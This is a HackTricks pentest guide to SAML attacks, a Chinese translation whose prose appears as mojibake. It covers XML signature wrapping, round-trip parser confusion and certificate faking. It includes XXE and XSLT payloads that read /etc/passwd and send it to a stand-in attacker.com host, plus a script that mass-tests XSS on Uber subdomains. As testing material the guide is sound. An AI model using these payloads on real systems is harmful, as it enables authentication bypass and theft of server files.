# SAML æ”»å‡»

## SAML æ”»å‡»

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## åŸºæœ¬ä¿¡æ¯

{% content-ref url="saml-basics.md" %}
[saml-basics.md](saml-basics.md)
{% endcontent-ref %}

## å·¥å…·

[**SAMLExtractor**](https://github.com/fadyosman/SAMLExtractor)ï¼šä¸€ä¸ªå¯ä»¥æ¥å— URL æˆ– URL åˆ—è¡¨å¹¶è¿”å› SAML æ¶ˆè´¹ URL çš„å·¥å…·ã€‚

## XML å¾€è¿”

åœ¨ XML ä¸­ï¼Œç­¾åéƒ¨åˆ†çš„ XML è¢«ä¿å­˜åœ¨å†…å­˜ä¸­ï¼Œç„¶åè¿›è¡Œä¸€äº›ç¼–ç /è§£ç ï¼Œå¹¶æ£€æŸ¥ç­¾åã€‚ç†æƒ³æƒ…å†µä¸‹ï¼Œè¿™ç§ç¼–ç /è§£ç ä¸åº”è¯¥æ”¹å˜æ•°æ®ï¼Œä½†åŸºäºè¿™ç§æƒ…å†µï¼Œ**è¢«æ£€æŸ¥çš„æ•°æ®å’ŒåŸå§‹æ•°æ®å¯èƒ½ä¸ç›¸åŒ**ã€‚

ä¾‹å¦‚ï¼Œæ£€æŸ¥ä»¥ä¸‹ä»£ç ï¼š
```ruby
require 'rexml/document'

doc = REXML::Document.new <<XML
<!DOCTYPE x [ <!NOTATION x SYSTEM 'x">]><!--'> ]>
<X>
<Y/><![CDATA[--><X><Z/><!--]]>-->
</X>
XML

puts "First child in original doc: " + doc.root.elements[1].name
doc = REXML::Document.new doc.to_s
puts "First child after round-trip: " + doc.root.elements[1].name
```
è¿è¡Œè¯¥ç¨‹åºé’ˆå¯¹ REXML 3.2.4 æˆ–æ›´æ—©ç‰ˆæœ¬å°†å¯¼è‡´ä»¥ä¸‹è¾“å‡ºï¼š
```
First child in original doc: Y
First child after round-trip: Z
```
è¿™æ˜¯REXMLå¦‚ä½•æŸ¥çœ‹ä¸Šè¿°ç¨‹åºçš„åŸå§‹XMLæ–‡æ¡£çš„ï¼š

![https://mattermost.com/blog/securing-xml-implementations-across-the-web/](<../../.gitbook/assets/image (1001).png>)

è¿™æ˜¯å®ƒåœ¨ç»è¿‡ä¸€è½®è§£æå’Œåºåˆ—åŒ–åçš„æ ·å­ï¼š

![https://mattermost.com/blog/securing-xml-implementations-across-the-web/](<../../.gitbook/assets/image (445).png>)

æœ‰å…³æ­¤æ¼æ´åŠå…¶æ»¥ç”¨æ–¹å¼çš„æ›´å¤šä¿¡æ¯ï¼š

* [https://mattermost.com/blog/securing-xml-implementations-across-the-web/](https://mattermost.com/blog/securing-xml-implementations-across-the-web/)
* [https://joonas.fi/2021/08/saml-is-insecure-by-design/](https://joonas.fi/2021/08/saml-is-insecure-by-design/)

## XMLç­¾ååŒ…è£…æ”»å‡»

åœ¨**XMLç­¾ååŒ…è£…æ”»å‡»ï¼ˆXSWï¼‰**ä¸­ï¼Œæ”»å‡»è€…åˆ©ç”¨XMLæ–‡æ¡£åœ¨ä¸¤ä¸ªä¸åŒé˜¶æ®µå¤„ç†æ—¶å‡ºç°çš„æ¼æ´ï¼š**ç­¾åéªŒè¯**å’Œ**åŠŸèƒ½è°ƒç”¨**ã€‚è¿™äº›æ”»å‡»æ¶‰åŠæ”¹å˜XMLæ–‡æ¡£ç»“æ„ã€‚å…·ä½“è€Œè¨€ï¼Œæ”»å‡»è€…**æ³¨å…¥ä¼ªé€ å…ƒç´ **ï¼Œè¿™äº›å…ƒç´ ä¸ä¼šå½±å“XMLç­¾åçš„æœ‰æ•ˆæ€§ã€‚è¿™ç§æ“æ§æ—¨åœ¨é€ æˆ**åº”ç”¨é€»è¾‘**åˆ†æçš„å…ƒç´ ä¸**ç­¾åéªŒè¯æ¨¡å—**æ£€æŸ¥çš„å…ƒç´ ä¹‹é—´çš„å·®å¼‚ã€‚å› æ­¤ï¼Œå°½ç®¡XMLç­¾ååœ¨æŠ€æœ¯ä¸Šä»ç„¶æœ‰æ•ˆå¹¶é€šè¿‡éªŒè¯ï¼Œä½†åº”ç”¨é€»è¾‘å¤„ç†çš„æ˜¯**æ¬ºè¯ˆå…ƒç´ **ã€‚å› æ­¤ï¼Œæ”»å‡»è€…æœ‰æ•ˆåœ°ç»•è¿‡äº†XMLç­¾åçš„**å®Œæ•´æ€§ä¿æŠ¤**å’Œ**æ¥æºè®¤è¯**ï¼Œä½¿å¾—**ä»»æ„å†…å®¹çš„æ³¨å…¥**å¾—ä»¥åœ¨ä¸è¢«æ£€æµ‹çš„æƒ…å†µä¸‹è¿›è¡Œã€‚

ä»¥ä¸‹æ”»å‡»åŸºäº[**è¿™ç¯‡åšå®¢æ–‡ç« **](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/) **å’Œ** [**è¿™ç¯‡è®ºæ–‡**](https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91.pdf)ã€‚å› æ­¤ï¼Œè¯·æŸ¥çœ‹è¿™äº›ä»¥è·å–æ›´å¤šè¯¦ç»†ä¿¡æ¯ã€‚

### XSW #1

* **ç­–ç•¥**ï¼šæ·»åŠ ä¸€ä¸ªåŒ…å«ç­¾åçš„æ–°æ ¹å…ƒç´ ã€‚
* **å½±å“**ï¼šéªŒè¯å™¨å¯èƒ½ä¼šåœ¨åˆæ³•çš„â€œResponse -> Assertion -> Subjectâ€å’Œæ”»å‡»è€…çš„â€œæ¶æ„æ–°Response -> Assertion -> Subjectâ€ä¹‹é—´æ„Ÿåˆ°å›°æƒ‘ï¼Œä»è€Œå¯¼è‡´æ•°æ®å®Œæ•´æ€§é—®é¢˜ã€‚

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-1.svg](<../../.gitbook/assets/image (506).png>)

### XSW #2

* **ä¸XSW #1çš„åŒºåˆ«**ï¼šä½¿ç”¨åˆ†ç¦»ç­¾åè€Œä¸æ˜¯å°è£…ç­¾åã€‚
* **å½±å“**ï¼šâ€œæ¶æ„â€ç»“æ„ï¼Œç±»ä¼¼äºXSW #1ï¼Œæ—¨åœ¨æ¬ºéª—å®Œæ•´æ€§æ£€æŸ¥åçš„ä¸šåŠ¡é€»è¾‘ã€‚

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-2.svg](<../../.gitbook/assets/image (466).png>)

### XSW #3

* **ç­–ç•¥**ï¼šåœ¨ä¸åŸå§‹æ–­è¨€ç›¸åŒçš„å±‚çº§ä¸Šæ„é€ ä¸€ä¸ªæ¶æ„æ–­è¨€ã€‚
* **å½±å“**ï¼šæ„å›¾ä½¿ä¸šåŠ¡é€»è¾‘æ··æ·†ï¼Œä»¥ä½¿ç”¨æ¶æ„æ•°æ®ã€‚

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-3.svg](<../../.gitbook/assets/image (120).png>)

### XSW #4

* **ä¸XSW #3çš„åŒºåˆ«**ï¼šåŸå§‹æ–­è¨€æˆä¸ºå¤åˆ¶ï¼ˆæ¶æ„ï¼‰æ–­è¨€çš„å­å…ƒç´ ã€‚
* **å½±å“**ï¼šä¸XSW #3ç±»ä¼¼ï¼Œä½†æ›´æ¿€è¿›åœ°æ”¹å˜XMLç»“æ„ã€‚

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-4.svg](<../../.gitbook/assets/image (551).png>)

### XSW #5

* **ç‹¬ç‰¹æ–¹é¢**ï¼šç­¾åå’ŒåŸå§‹æ–­è¨€éƒ½ä¸ç¬¦åˆæ ‡å‡†é…ç½®ï¼ˆå°è£…/å°è£…/åˆ†ç¦»ï¼‰ã€‚
* **å½±å“**ï¼šå¤åˆ¶çš„æ–­è¨€å°è£…äº†ç­¾åï¼Œä¿®æ”¹äº†é¢„æœŸçš„æ–‡æ¡£ç»“æ„ã€‚

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-5.svg](<../../.gitbook/assets/image (1030).png>)

### XSW #6

* **ç­–ç•¥**ï¼šä¸XSW #4å’Œ#5ç±»ä¼¼çš„ä½ç½®æ’å…¥ï¼Œä½†æœ‰ä¸€ä¸ªå˜åŒ–ã€‚
* **å½±å“**ï¼šå¤åˆ¶çš„æ–­è¨€å°è£…äº†ç­¾åï¼Œç„¶åå°è£…äº†åŸå§‹æ–­è¨€ï¼Œåˆ›å»ºäº†ä¸€ä¸ªåµŒå¥—çš„æ¬ºéª—ç»“æ„ã€‚

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-6.svg](<../../.gitbook/assets/image (169).png>)

### XSW #7

* **ç­–ç•¥**ï¼šæ’å…¥ä¸€ä¸ªæ‰©å±•å…ƒç´ ï¼Œå¤åˆ¶çš„æ–­è¨€ä½œä¸ºå­å…ƒç´ ã€‚
* **å½±å“**ï¼šåˆ©ç”¨æ‰©å±•å…ƒç´ çš„è¾ƒå°‘é™åˆ¶çš„æ¨¡å¼ï¼Œç»•è¿‡æ¨¡å¼éªŒè¯å¯¹ç­–ï¼Œç‰¹åˆ«æ˜¯åœ¨åƒOpenSAMLè¿™æ ·çš„åº“ä¸­ã€‚

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-7.svg](<../../.gitbook/assets/image (971).png>)

### XSW #8

* **ä¸XSW #7çš„åŒºåˆ«**ï¼šåˆ©ç”¨å¦ä¸€ä¸ªè¾ƒå°‘é™åˆ¶çš„XMLå…ƒç´ è¿›è¡Œå˜ä½“æ”»å‡»ã€‚
* **å½±å“**ï¼šåŸå§‹æ–­è¨€æˆä¸ºè¾ƒå°‘é™åˆ¶å…ƒç´ çš„å­å…ƒç´ ï¼Œåè½¬äº†XSW #7ä¸­ä½¿ç”¨çš„ç»“æ„ã€‚

![https://epi052.gitlab.io/notes-to-self/img/saml/xsw-8.svg](<../../.gitbook/assets/image (541).png>)

### å·¥å…·

æ‚¨å¯ä»¥ä½¿ç”¨Burpæ‰©å±•[**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e)æ¥è§£æè¯·æ±‚ï¼Œåº”ç”¨æ‚¨é€‰æ‹©çš„ä»»ä½•XSWæ”»å‡»å¹¶å‘èµ·å®ƒã€‚

## XXE

å¦‚æœæ‚¨ä¸çŸ¥é“XXEæ”»å‡»æ˜¯ä»€ä¹ˆï¼Œè¯·é˜…è¯»ä»¥ä¸‹é¡µé¢ï¼š

{% content-ref url="../xxe-xee-xml-external-entity.md" %}
[xxe-xee-xml-external-entity.md](../xxe-xee-xml-external-entity.md)
{% endcontent-ref %}

SAMLå“åº”æ˜¯**è§£å‹ç¼©å’ŒBase64ç¼–ç çš„XMLæ–‡æ¡£**ï¼Œå¯èƒ½ä¼šå—åˆ°XMLå¤–éƒ¨å®ä½“ï¼ˆXXEï¼‰æ”»å‡»çš„å½±å“ã€‚é€šè¿‡æ“æ§SAMLå“åº”çš„XMLç»“æ„ï¼Œæ”»å‡»è€…å¯ä»¥å°è¯•åˆ©ç”¨XXEæ¼æ´ã€‚ä»¥ä¸‹æ˜¯è¿™ç§æ”»å‡»çš„å¯è§†åŒ–æ–¹å¼ï¼š
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY    file SYSTEM "file:///etc/passwd">
<!ENTITY dtd SYSTEM "http://www.attacker.com/text.dtd" >]>
<samlp:Response ... ID="_df55c0bb940c687810b436395cf81760bb2e6a92f2" ...>
<saml:Issuer>...</saml:Issuer>
<ds:Signature ...>
<ds:SignedInfo>
<ds:CanonicalizationMethod .../>
<ds:SignatureMethod .../>
<ds:Reference URI="#_df55c0bb940c687810b436395cf81760bb2e6a92f2">...</ds:Reference>
</ds:SignedInfo>
<ds:SignatureValue>...</ds:SignatureValue>
[...]
```
## Tools

æ‚¨è¿˜å¯ä»¥ä½¿ç”¨ Burp æ‰©å±• [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) ä» SAML è¯·æ±‚ç”Ÿæˆ POCï¼Œä»¥æµ‹è¯•å¯èƒ½çš„ XXE æ¼æ´å’Œ SAML æ¼æ´ã€‚

è¿˜å¯ä»¥æŸ¥çœ‹è¿™ä¸ªæ¼”è®²: [https://www.youtube.com/watch?v=WHn-6xHL7mI](https://www.youtube.com/watch?v=WHn-6xHL7mI)

## XSLT via SAML

æœ‰å…³ XSLT çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·è®¿é—®ï¼š

{% content-ref url="../xslt-server-side-injection-extensible-stylesheet-language-transformations.md" %}
[xslt-server-side-injection-extensible-stylesheet-language-transformations.md](../xslt-server-side-injection-extensible-stylesheet-language-transformations.md)
{% endcontent-ref %}

å¯æ‰©å±•æ ·å¼è¡¨è¯­è¨€è½¬æ¢ (XSLT) å¯ç”¨äºå°† XML æ–‡æ¡£è½¬æ¢ä¸ºå„ç§æ ¼å¼ï¼Œå¦‚ HTMLã€JSON æˆ– PDFã€‚é‡è¦çš„æ˜¯è¦æ³¨æ„ **XSLT è½¬æ¢åœ¨æ•°å­—ç­¾åéªŒè¯ä¹‹å‰æ‰§è¡Œ**ã€‚è¿™æ„å‘³ç€å³ä½¿æ²¡æœ‰æœ‰æ•ˆçš„ç­¾åï¼Œæ”»å‡»ä¹Ÿå¯ä»¥æˆåŠŸï¼›è‡ªç­¾åæˆ–æ— æ•ˆç­¾åä¹Ÿè¶³ä»¥ç»§ç»­ã€‚

åœ¨è¿™é‡Œï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°ä¸€ä¸ª **POC** æ¥æ£€æŸ¥è¿™ç§æ¼æ´ï¼Œåœ¨æœ¬èŠ‚å¼€å¤´æåˆ°çš„ hacktricks é¡µé¢ä¸­å¯ä»¥æ‰¾åˆ°æœ‰æ•ˆè½½è·ã€‚
```xml
<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
...
<ds:Transforms>
<ds:Transform>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="doc">
<xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
<xsl:variable name="escaped" select="encode-for-uri($file)"/>
<xsl:variable name="attackerUrl" select="'http://attacker.com/'"/>
<xsl:variable name="exploitUrl" select="concat($attackerUrl,$escaped)"/>
<xsl:value-of select="unparsed-text($exploitUrl)"/>
</xsl:template>
</xsl:stylesheet>
</ds:Transform>
</ds:Transforms>
...
</ds:Signature>
```
### Tool

æ‚¨è¿˜å¯ä»¥ä½¿ç”¨ Burp æ‰©å±• [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) ä» SAML è¯·æ±‚ç”Ÿæˆ POCï¼Œä»¥æµ‹è¯•å¯èƒ½çš„ XSLT æ¼æ´ã€‚

è¿˜å¯ä»¥æŸ¥çœ‹è¿™ä¸ªæ¼”è®²: [https://www.youtube.com/watch?v=WHn-6xHL7mI](https://www.youtube.com/watch?v=WHn-6xHL7mI)

## XML Signature Exclusion <a href="#xml-signature-exclusion" id="xml-signature-exclusion"></a>

**XML Signature Exclusion** è§‚å¯Ÿ SAML å®ç°çš„è¡Œä¸ºï¼Œå½“ Signature å…ƒç´ ä¸å­˜åœ¨æ—¶ã€‚å¦‚æœè¯¥å…ƒç´ ç¼ºå¤±ï¼Œ**å¯èƒ½ä¸ä¼šè¿›è¡Œç­¾åéªŒè¯**ï¼Œä½¿å…¶å˜å¾—è„†å¼±ã€‚å¯ä»¥é€šè¿‡æ›´æ”¹é€šå¸¸ç”±ç­¾åéªŒè¯çš„å†…å®¹æ¥æµ‹è¯•è¿™ä¸€ç‚¹ã€‚

![https://epi052.gitlab.io/notes-to-self/img/saml/signature-exclusion.svg](<../../.gitbook/assets/image (457).png>)

### Tool <a href="#xml-signature-exclusion-how-to" id="xml-signature-exclusion-how-to"></a>

æ‚¨è¿˜å¯ä»¥ä½¿ç”¨ Burp æ‰©å±• [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e)ã€‚æ‹¦æˆª SAML å“åº”å¹¶ç‚¹å‡» `Remove Signatures`ã€‚è¿™æ ·ï¼Œ**æ‰€æœ‰** Signature å…ƒç´ å°†è¢«ç§»é™¤ã€‚

åœ¨ç§»é™¤ç­¾ååï¼Œå…è®¸è¯·æ±‚ç»§ç»­å‘é€åˆ°ç›®æ ‡ã€‚å¦‚æœæœåŠ¡ä¸éœ€è¦ç­¾å

## Certificate Faking <a href="#certificate-faking" id="certificate-faking"></a>

## Certificate Faking

Certificate Faking æ˜¯ä¸€ç§æµ‹è¯• **æœåŠ¡æä¾›è€… (SP) æ˜¯å¦æ­£ç¡®éªŒè¯ SAML æ¶ˆæ¯æ˜¯å¦ç”±å—ä¿¡ä»»çš„èº«ä»½æä¾›è€… (IdP) ç­¾å** çš„æŠ€æœ¯ã€‚å®ƒæ¶‰åŠä½¿ç”¨ \***è‡ªç­¾åè¯ä¹¦** æ¥ç­¾ç½² SAML å“åº”æˆ–å£°æ˜ï¼Œè¿™æœ‰åŠ©äºè¯„ä¼° SP å’Œ IdP ä¹‹é—´çš„ä¿¡ä»»éªŒè¯è¿‡ç¨‹ã€‚

### å¦‚ä½•è¿›è¡Œ Certificate Faking

ä»¥ä¸‹æ­¥éª¤æ¦‚è¿°äº†ä½¿ç”¨ [SAML Raider](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e) Burp æ‰©å±•çš„è¿‡ç¨‹ï¼š

1. æ‹¦æˆª SAML å“åº”ã€‚
2. å¦‚æœå“åº”åŒ…å«ç­¾åï¼Œä½¿ç”¨ `Send Certificate to SAML Raider Certs` æŒ‰é’®å°†è¯ä¹¦å‘é€åˆ° SAML Raider Certsã€‚
3. åœ¨ SAML Raider è¯ä¹¦é€‰é¡¹å¡ä¸­ï¼Œé€‰æ‹©å¯¼å…¥çš„è¯ä¹¦å¹¶ç‚¹å‡» `Save and Self-Sign` åˆ›å»ºåŸå§‹è¯ä¹¦çš„è‡ªç­¾åå…‹éš†ã€‚
4. è¿”å›åˆ° Burp çš„ä»£ç†ä¸­æ‹¦æˆªçš„è¯·æ±‚ã€‚ä» XML Signature ä¸‹æ‹‰èœå•ä¸­é€‰æ‹©æ–°çš„è‡ªç­¾åè¯ä¹¦ã€‚
5. ä½¿ç”¨ `Remove Signatures` æŒ‰é’®ç§»é™¤ä»»ä½•ç°æœ‰ç­¾åã€‚
6. ä½¿ç”¨ **`(Re-)Sign Message`** æˆ– **`(Re-)Sign Assertion`** æŒ‰é’®ï¼ˆè§†æƒ…å†µè€Œå®šï¼‰ä½¿ç”¨æ–°è¯ä¹¦ç­¾ç½²æ¶ˆæ¯æˆ–å£°æ˜ã€‚
7. è½¬å‘ç­¾åæ¶ˆæ¯ã€‚æˆåŠŸçš„èº«ä»½éªŒè¯è¡¨æ˜ SP æ¥å—ç”±æ‚¨çš„è‡ªç­¾åè¯ä¹¦ç­¾ç½²çš„æ¶ˆæ¯ï¼Œæ­ç¤º SAML æ¶ˆæ¯éªŒè¯è¿‡ç¨‹ä¸­çš„æ½œåœ¨æ¼æ´ã€‚

## Token Recipient Confusion / Service Provider Target Confusion <a href="#token-recipient-confusion" id="token-recipient-confusion"></a>

Token Recipient Confusion å’Œ Service Provider Target Confusion æ¶‰åŠæ£€æŸ¥ **æœåŠ¡æä¾›è€…æ˜¯å¦æ­£ç¡®éªŒè¯å“åº”çš„é¢„æœŸæ¥æ”¶è€…**ã€‚æœ¬è´¨ä¸Šï¼Œå¦‚æœèº«ä»½éªŒè¯å“åº”æ˜¯é’ˆå¯¹ä¸åŒæä¾›è€…çš„ï¼ŒæœåŠ¡æä¾›è€…åº”è¯¥æ‹’ç»è¯¥å“åº”ã€‚è¿™é‡Œçš„å…³é”®å…ƒç´ æ˜¯ **Recipient** å­—æ®µï¼Œä½äº SAML å“åº”çš„ **SubjectConfirmationData** å…ƒç´ ä¸­ã€‚è¯¥å­—æ®µæŒ‡å®šä¸€ä¸ª URLï¼ŒæŒ‡ç¤ºå£°æ˜å¿…é¡»å‘é€åˆ°å“ªé‡Œã€‚å¦‚æœå®é™…æ¥æ”¶è€…ä¸é¢„æœŸçš„æœåŠ¡æä¾›è€…ä¸åŒ¹é…ï¼Œåˆ™è¯¥å£°æ˜åº”è¢«è§†ä¸ºæ— æ•ˆã€‚

#### **å·¥ä½œåŸç†**

ä¸ºäº†ä½¿ SAML Token Recipient Confusion (SAML-TRC) æ”»å‡»å¯è¡Œï¼Œå¿…é¡»æ»¡è¶³æŸäº›æ¡ä»¶ã€‚é¦–å…ˆï¼ŒæœåŠ¡æä¾›è€…ä¸Šå¿…é¡»æœ‰ä¸€ä¸ªæœ‰æ•ˆçš„å¸æˆ·ï¼ˆç§°ä¸º SP-Legitï¼‰ã€‚å…¶æ¬¡ï¼Œç›®æ ‡æœåŠ¡æä¾›è€…ï¼ˆSP-Targetï¼‰å¿…é¡»æ¥å—æ¥è‡ªåŒä¸€èº«ä»½æä¾›è€…çš„ä»¤ç‰Œï¼Œè¯¥èº«ä»½æä¾›è€…ä¸º SP-Legit æä¾›æœåŠ¡ã€‚

åœ¨è¿™äº›æ¡ä»¶ä¸‹ï¼Œæ”»å‡»è¿‡ç¨‹æ˜¯ç›´æ¥çš„ã€‚é€šè¿‡å…±äº«çš„èº«ä»½æä¾›è€…ä¸ SP-Legit å¯åŠ¨ä¸€ä¸ªçœŸå®ä¼šè¯ã€‚èº«ä»½æä¾›è€…åˆ° SP-Legit çš„ SAML å“åº”è¢«æ‹¦æˆªã€‚ç„¶åå°†è¿™ä¸ªåŸæœ¬é’ˆå¯¹ SP-Legit çš„æ‹¦æˆª SAML å“åº”é‡å®šå‘åˆ° SP-Targetã€‚æ”»å‡»æˆåŠŸçš„æ ‡å‡†æ˜¯ SP-Target æ¥å—è¯¥å£°æ˜ï¼Œä»è€Œå…è®¸è®¿é—®ä¸ç”¨äº SP-Legit çš„ç›¸åŒå¸æˆ·åä¸‹çš„èµ„æºã€‚
```python
# Example to simulate interception and redirection of SAML Response
def intercept_and_redirect_saml_response(saml_response, sp_target_url):
"""
Simulate the interception of a SAML Response intended for SP-Legit and its redirection to SP-Target.

Args:
- saml_response: The SAML Response intercepted (in string format).
- sp_target_url: The URL of the SP-Target to which the SAML Response is redirected.

Returns:
- status: Success or failure message.
"""
# This is a simplified representation. In a real scenario, additional steps for handling the SAML Response would be required.
try:
# Code to send the SAML Response to SP-Target would go here
return "SAML Response successfully redirected to SP-Target."
except Exception as e:
return f"Failed to redirect SAML Response: {e}"
```
## XSS åœ¨æ³¨é”€åŠŸèƒ½ä¸­çš„åº”ç”¨

åŸå§‹ç ”ç©¶å¯ä»¥é€šè¿‡ [this link](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/) è®¿é—®ã€‚

åœ¨ç›®å½•æš´åŠ›ç ´è§£çš„è¿‡ç¨‹ä¸­ï¼Œå‘ç°äº†ä¸€ä¸ªæ³¨é”€é¡µé¢ï¼š
```
https://carbon-prototype.uberinternal.com:443/oidauth/logout
```
è®¿é—®æ­¤é“¾æ¥æ—¶ï¼Œå‘ç”Ÿäº†é‡å®šå‘åˆ°ï¼š
```
https://carbon-prototype.uberinternal.com/oidauth/prompt?base=https%3A%2F%2Fcarbon-prototype.uberinternal.com%3A443%2Foidauth&return_to=%2F%3Fopenid_c%3D1542156766.5%2FSnNQg%3D%3D&splash_disabled=1
```
è¿™æ­ç¤ºäº† `base` å‚æ•°æ¥å—ä¸€ä¸ª URLã€‚è€ƒè™‘åˆ°è¿™ä¸€ç‚¹ï¼Œå‡ºç°äº†ç”¨ `javascript:alert(123);` æ›¿ä»£ URL çš„æƒ³æ³•ï¼Œä»¥å°è¯•å‘èµ· XSSï¼ˆè·¨ç«™è„šæœ¬ï¼‰æ”»å‡»ã€‚

### å¤§è§„æ¨¡åˆ©ç”¨

[æ¥è‡ªè¿™é¡¹ç ”ç©¶](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/)ï¼š

[**SAMLExtractor**](https://github.com/fadyosman/SAMLExtractor) å·¥å…·è¢«ç”¨æ¥åˆ†æ `uberinternal.com` çš„å­åŸŸï¼Œä»¥å¯»æ‰¾ä½¿ç”¨ç›¸åŒåº“çš„åŸŸã€‚éšåï¼Œå¼€å‘äº†ä¸€ä¸ªè„šæœ¬æ¥é’ˆå¯¹ `oidauth/prompt` é¡µé¢ã€‚è¯¥è„šæœ¬é€šè¿‡è¾“å…¥æ•°æ®å¹¶æ£€æŸ¥å…¶æ˜¯å¦åæ˜ åœ¨è¾“å‡ºä¸­æ¥æµ‹è¯• XSSï¼ˆè·¨ç«™è„šæœ¬ï¼‰ã€‚åœ¨è¾“å…¥ç¡®å®è¢«åæ˜ çš„æƒ…å†µä¸‹ï¼Œè„šæœ¬å°†è¯¥é¡µé¢æ ‡è®°ä¸ºæ˜“å—æ”»å‡»ã€‚
```python
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from colorama import init ,Fore, Back, Style
init()

with open("/home/fady/uberSAMLOIDAUTH") as urlList:
for url in urlList:
url2 = url.strip().split("oidauth")[0] + "oidauth/prompt?base=javascript%3Aalert(123)%3B%2F%2FFady&return_to=%2F%3Fopenid_c%3D1520758585.42StPDwQ%3D%3D&splash_disabled=1"
request = requests.get(url2, allow_redirects=True,verify=False)
doesit = Fore.RED + "no"
if ("Fady" in request.content):
doesit = Fore.GREEN + "yes"
print(Fore.WHITE + url2)
print(Fore.WHITE + "Len : " + str(len(request.content)) + "   Vulnerable : " + doesit)
```
## å‚è€ƒæ–‡çŒ®

* [https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/)
* [https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/)\\
* [https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/)
* [https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/)

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
